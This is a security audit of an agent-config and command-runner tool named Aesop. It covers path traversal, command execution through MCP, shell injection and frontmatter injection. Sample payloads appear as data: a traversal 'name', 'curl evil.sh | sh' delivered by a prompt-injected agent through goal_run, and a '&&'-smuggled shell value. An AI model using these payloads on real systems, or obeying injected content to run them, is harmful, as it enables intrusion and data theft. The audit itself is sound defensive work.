# Security audit — Aesop v0.1.0

**Date:** 2026-06-10 · **Scope:** the whole repository (`src/` ~7,100 LoC, schema, registry seeds,
packaging) at commit `a32b889` · **Method:** manual source review of every shell-exec, file-write,
network-fetch, untrusted-parse, and path-construction site; dependency audit; packaging review.
This is a white-box audit by the author.

> **Status: ALL FINDINGS REMEDIATED (2026-06-11).** Every finding below is fixed and pinned by a
> regression test in `src/security.test.ts` (54 tests green). This document is retained as the
> record of what was found and how it was closed; the "Fix" note under each finding describes the
> shipped change. The headline risks came from Aesop's two unusual powers — it **executes shell
> commands** and it **turns untrusted registry content into files on disk** — and the fixes
> harden both at multiple layers (a name guard, a write-containment backstop, validated loads, a
> minimized MCP surface, and structured serialization).

## Trust boundaries

| Boundary | Trusted? | Why it matters |
|---|---|---|
| `aesop.yaml` in your own repo | mostly trusted | you wrote it — but `doctor`/`goal run` execute commands from it |
| a cloned **third-party** repo's `aesop.yaml` | **untrusted** | running `aesop doctor` there executes *their* test command |
| federated registry content (ecc, awesome-copilot, any `github:`/`path:`) | **untrusted** | becomes files in your repo on `add` + `compile` |
| MCP client calling `aesop mcp serve` | **untrusted** | may be driven by prompt-injected agent content |
| the six emitted config trees | generated | integrity depends on the above |

## F1 — Path traversal → arbitrary file write from registry frontmatter `name` {#f1}

**Severity: High** · `src/registry.ts:141`, `src/emitters/claude-code.ts:108`,
`src/emitters/codex.ts:53`, `src/emitters/copilot.ts:46`, `src/emitters/shared.ts:27`,
`src/commands/compile.ts:149-157`

Emitters build the output path from the agent's **name**, and `parseAgent` takes that name from
the primitive's **frontmatter** (registry-controlled), not the manifest reference:

```ts
// registry.ts:141
name: (data.name as string) ?? resolved.name,
// claude-code.ts:108
path: `.claude/agents/${spec.name}.md`,
// compile.ts:149-157 — no containment check
const abs = join(opts.cwd, path);
await mkdir(dirname(abs), { recursive: true });
await writeFile(abs, content, "utf8");
```

`join()` normalizes `..`, and nothing asserts the result stays inside the repo. No primitive name
is sanitized anywhere — the schema constrains only `registries` and `scope` patterns, never names
(`src/registry.ts:78/84`, `src/federation.ts:154/199` are all unsanitized too).

**Exploit:** a user runs the entirely normal `aesop add agent code-reviewer --from some-registry`
(innocuous name). That registry's `agents/code-reviewer.md` contains:

```yaml
---
name: ../../../../../../tmp/aesop-pwned
description: hi
---
attacker-controlled body
```

On the next `aesop compile`, the emitter writes attacker-controlled content to
`/tmp/aesop-pwned.md` — **outside the repo**, with no traversal visible in anything the user
typed or reviewed. Across emitters the forced extension is `.md`/`.toml`. Supplying a traversal
*name* to `add` (e.g. `aesop add skill ../../x`) escalates to arbitrary-extension writes via the
vendor/skill paths (`federation.ts:199`, `vendorDir`).

**Impact:** overwrite any `.md`/`.toml` the process can write — another repo's `CLAUDE.md`/
`AGENTS.md` (propagating prompt injection into *other* projects' agents), docs, config. Forced
extension blocks one-shot RCE, but this is a containment escape with attacker-controlled content
and is the most serious finding. Reachable from the MCP `add` tool too (see F2).

**Fix:** reject or slugify any name that contains a path separator or `..`; and add a final
containment assertion in `compile` — resolve each emitted path and confirm it is inside
`opts.cwd` before `writeFile`. The codebase already has `slugify` (`src/emitters/shared.ts:6`),
used for scopes; apply the same discipline to names. Add `"pattern": "^[a-z0-9][a-z0-9._-]*$"`
to the name fields in `schemas/aesop.schema.json` as a second layer.

## F2 — Arbitrary command execution via MCP `goal_run.agent` {#f2}

**Severity: High** · `src/commands/mcp.ts:36,57` → `src/commands/goal.ts:goalRun` →
`src/loops/ralph.ts:41`

The MCP tool surface exposes `goal_run` with a free-string `agent` parameter, passed straight to
the Ralph runner, which executes it via `sh -c`:

```ts
// mcp.ts:36
{ name: "goal_run", ... inputSchema: obj({ ...cwdProp, name, agent }, ["name"]) }
// mcp.ts:57
return goalRun({ cwd, name, ...(args.agent ? { agent: args.agent } : {}) });
// ralph.ts:41
await exec("sh", ["-c", command], { cwd, env: { ...process.env, ...env }, ... });
```

**Exploit:** an agent connected to `aesop mcp serve` — including one steered by prompt-injected
content in a file or web page it read — calls `goal_run` with
`agent: "curl evil.sh | sh"`. Aesop runs it. The docs explicitly position the MCP server as a way
for **shell-less / sandboxed harnesses** to drive Aesop, so this is a sandbox-escape primitive,
not a no-op.

**Impact:** arbitrary command execution with the user's full environment (F8), reachable from an
untrusted MCP caller. The MCP surface already (correctly) omits `eject`/`update --apply`/`bundle`
as too sensitive; `goal_run.agent` is a larger hole than any of them.

**Fix:** drop `agent` from the MCP `goal_run` schema — force the vetted, compiled
`agent_command` from `.aesop/goals/<name>.ralph.json`. More broadly, treat every MCP argument as
untrusted: `goal_run` should only run named, already-authored recipes; `doctor`/`add` carry the
F1/F3 risks and deserve the same scrutiny.

## F3 — `doctor`/`goal run` execute untrusted-manifest commands; `command -v` interpolates {#f3}

**Severity: Medium** · `src/commands/doctor.ts:97,108`, `src/loops/ralph.ts:41`

`doctor` runs the manifest's test command, and probes MCP binaries by **interpolating** the
manifest-supplied command into a shell string:

```ts
// doctor.ts:97
await exec("sh", ["-c", testCmd], { cwd, timeout: 120_000 });
// doctor.ts:108  — bin comes from manifest mcp.command.split(" ")[0]
await exec("sh", ["-c", `command -v ${bin}`], { cwd, timeout: 10_000 });
```

A `bin` of `x&&id>/tmp/p&&true` injects into the probe. More importantly, the guides encourage
adopting *other people's* environments; cloning a hostile repo and running `aesop doctor` (or
`aesop goal run`) executes attacker code with no warning. There is no sandbox and no `--no-exec`
audit mode.

**Fix:** never interpolate `bin` — check resolvability without a shell (e.g.
`exec("sh", ["-c", 'command -v "$1"', "_", bin])` so `bin` is `$1`, or resolve PATH in JS). Print
a clear warning before executing manifest-supplied commands in a repo whose `aesop.yaml` you
didn't author; offer a static-only audit mode.

## F4 — YAML/frontmatter injection in emitted files {#f4}

**Severity: Medium** · `src/emitters/claude-code.ts:100-101`, `src/emitters/copilot.ts:28`,
`src/emitters/codex.ts:45-46` (TOML escaping)

Emitted frontmatter is built by string concatenation of untrusted fields, not structured
serialization:

```ts
// claude-code.ts:100-101
`name: ${spec.name}`,
`description: ${spec.description}`,
// copilot.ts:28
content: `---\napplyTo: "${glob}"\n---\n\n...`,
```

A registry-controlled `description` of `x\nmodel: opus\ntools: Bash` injects extra frontmatter
keys; a malicious `applyTo` containing `"` and a newline injects arbitrary Copilot instruction
frontmatter. This can flip an emitted agent's `tools`/`model`, widen an instruction's scope, or
defeat the emitted "read-only" note. The Codex path uses `tomlString`/`replaceAll('"""',...)`
which is closer to correct but still hand-rolled.

**Fix:** emit structured headers with the YAML `stringify` already imported in
`src/federation.ts` (it's used for normalization), never by interpolation. For TOML, prefer a
small serializer over ad-hoc escaping.

## F5 — Manifest consumed without validation on add/update/goal/lessons {#f5}

**Severity: Medium (defense-in-depth)** · `src/commands/add.ts:27`, `goal.ts:17`, `lessons.ts:22`,
`update.ts:52`, `sync.ts:88`, `doctor.ts:77`

Only `compile`/`sync`'s `parseManifest` runs `validateManifest`. The other entry points do
`parse(raw) as Manifest` — a *type assertion*, not validation — then act on the data
(`fetchRegistry`, exec, writes). The schema's `registries` pattern (the one control that would
constrain a `github:`/`http:` source) therefore isn't enforced on the fetch paths. Today the
`http`/`github` prefix check in `fetchRegistry` happens to prevent git argument injection, but
the validation gap is load-bearing by accident.

**Fix:** one `loadManifest` helper that always `validateManifest`s; reject on invalid. Combined
with the name pattern from F1, this closes the traversal at the schema layer too.

## F6 — git clone arg hygiene & cache-name collisions {#f6}

**Severity: Low** · `src/federation.ts:43-50,28-32`

`git clone --depth 1 --quiet <url> <dir>` has no `--` separator (mitigated only because the
schema/prefix forces `http(s)://`/`github:`). Separately, `registryName` keys the cache and
vendor directories by the **last path segment** (`github:a/shared` and `github:b/shared` both →
`shared`), so two distinct registries collide in `.aesop/cache/shared` and
`.aesop/vendor/shared` — a `git pull --ff-only` then runs against whichever origin was cloned
first. Integrity/confusion, not RCE.

**Fix:** add `--` before positional args; key cache/vendor by a short hash of the full source
string, keep the friendly short name only for display.

## F7 — Arbitrary local `.yaml` read via profile traversal {#f7}

**Severity: Low** · `src/index.ts:263`, `src/profile.ts:22-24`

```ts
console.log(readFileSync(join(dir, `${positionals[2]}.yaml`), "utf8")); // profile show
```

`aesop profile show ../../../../etc/some` reads `…/etc/some.yaml`; a manifest `pathway.profile`
of `../../secret` reads an arbitrary `.yaml` at compile. Self-inflicted and local (the user runs
their own command), `.yaml`-suffixed, so impact is minor information disclosure.

**Fix:** validate profile names against `^[a-z0-9-]+$` before building the path.

## F8 — Full environment passed to loop commands {#f8}

**Severity: Low / informational** · `src/loops/ralph.ts:43`

`env: { ...process.env, ...env }` gives every loop tick the parent environment, including
secrets (API keys). Necessary for the default `claude -p`, but a malicious recipe `verify`
command (F3) can exfiltrate the environment. Document the expectation; consider an env allowlist
when running recipes that originated from untrusted manifests.

## Positive controls (done right) {#positive-controls}

- **Tiny, clean dependency surface.** Two runtime deps (`ajv`, `yaml`); `npm audit` = 0
  vulnerabilities.
- **Safe YAML.** The `yaml` library is used with its default schema (no custom tags) — no
  `!!js/function`-style deserialization RCE.
- **`execFile` with argv arrays** for `git`/`tar` (`federation.ts`, `bundle.ts`) — no shell, so
  those inputs can't inject. (The `sh -c` sites in F2/F3 are the exceptions to fix.)
- **No ReDoS.** Fence and secret regexes are lazy/bounded and run per-line (`render.ts:9,20`,
  `doctor.ts:42`).
- **Secrets discipline.** Emitted MCP configs reference env-var *names* (`${VAR}`) only; `doctor`
  actively scans for committed credentials; `npm pack` ships only `dist/registry/profiles/schemas`
  — verified no `aesop.yaml`, `.aesop/vendor`, `.aesop/cache`, or `.env` leak into the package.
- **Untrusted-by-design federation.** Registry content is vendored into git (reviewable in the
  PR diff) and SHA-pinned; `update` never auto-applies. F1/F4 are failures to *enforce* that
  stance, not absence of it.
- **Defense already emitted.** The `block-dangerous-commands` hook, three permission tiers, and
  `GUARDRAILS.md` are generated for downstream repos; the MCP surface deliberately excludes
  `eject`/`update --apply`/`bundle`.

## Prioritized remediation

1. **F1 + F5 together** (highest value, ~½ day): a `safeName()` guard (reject separators/`..`) +
   a `assertWithinRepo(path)` check before every emitter write + a single validating
   `loadManifest` + name `pattern` in the schema. Closes the arbitrary-write at three layers.
2. **F2** (1 line of schema + a note): remove `agent` from the MCP `goal_run` tool; document the
   MCP server's caller as untrusted.
3. **F4** (~2 hrs): serialize all emitted frontmatter via `yaml.stringify`.
4. **F3** (~2 hrs): de-interpolate `command -v`; add a warning/`--no-exec` for foreign manifests.
5. **F6/F7/F8** (cleanup): `--` separator, hash-keyed cache dirs, profile-name validation, an
   env note.

Each fix is small and testable; suggested regression tests: a malicious-frontmatter fixture that
must *not* escape the repo (F1), an MCP `goal_run` without `agent` honored (F2), a
frontmatter-injection fixture that round-trips through `yaml.parse` to one key (F4).
